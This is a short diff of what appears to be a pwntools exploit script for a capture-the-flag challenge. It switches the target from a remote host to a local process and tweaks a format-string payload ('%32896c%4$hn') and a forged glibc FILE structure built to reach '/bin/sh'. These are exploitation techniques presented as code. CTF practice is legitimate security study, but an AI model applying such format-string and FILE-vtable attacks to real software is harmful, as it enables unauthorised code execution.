@@ -26,7 +26,8 @@ def dummy(n):
     return cyclic(n)
 
 if __name__ == "__main__":
-    p = remote("command.pwn2.win", 1337)
+   # p = remote("command.pwn2.win", 1337)
+    p = process(e.path)
 
     p.recvuntil("Your name: ")
     p.send(b"%32896c%4$hn") # 0x8080
@@ -67,7 +68,7 @@ if __name__ == "__main__":
     context.arch = "amd64"
     fake_file = IO_FILE_plus_struct()
 
-    fake_file._flags = 0xfbad8080
+    fake_file._flags = 0xfbad2c84
     fake_file._IO_buf_base = str_bin_sh
     fake_file.vtable = _io_str_jumps
 
